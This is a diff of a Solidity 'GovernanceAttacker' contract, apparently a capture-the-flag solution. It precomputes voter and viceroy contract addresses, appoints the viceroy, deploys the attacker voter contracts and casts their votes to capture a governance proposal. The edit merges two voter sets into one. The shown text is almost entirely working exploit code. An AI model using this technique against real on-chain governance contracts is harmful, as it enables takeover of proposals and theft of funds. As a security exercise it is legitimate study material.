@@ -131,26 +131,24 @@ contract GovernanceAttacker {
         uint256 proposalId = uint256(keccak256(proposal));
 
         uint nonce = 1;
-        address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
-        address[] memory preCalcedVotersB = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5, 10);
-        address preCalcedViceroyA = getViceroyAddress(governance, proposal, preCalcedVotersA);
-        address preCalcedViceroyB = getViceroyAddress(governance, proposal, preCalcedVotersB);
+        address[] memory preCalcedVoters = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
+        address preCalcedViceroy = getViceroyAddress(governance, proposal, preCalcedVoters);
 
         // elect viceroy
-        governance.appointViceroy(preCalcedViceroyA, nonce);
+        governance.appointViceroy(preCalcedViceroy, nonce);
 
         // deploy viceroy
-        AttackerViceroy viceroyA = deployViceroyAttack(governance, proposal, preCalcedVotersA);
+        AttackerViceroy viceroy = deployViceroyAttack(governance, proposal, preCalcedVoters);
 
         // deploy voter
         deployVoters(5);
 
         // vote
-        for (uint i; i < preCalcedVotersA.length; i++) {
-            AttackerVoter(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroyA));
+        for (uint i; i < preCalcedVoters.length; i++) {
+            AttackerVoter(preCalcedVoters[i]).vote(governance, proposalId, address(viceroy));
         }
         (uint votes, ) = governance.proposals(proposalId);
-        assert(votes == preCalcedVotersA.length);
+        assert(votes == preCalcedVoters.length);
     }
 
     function deployViceroyAttack(
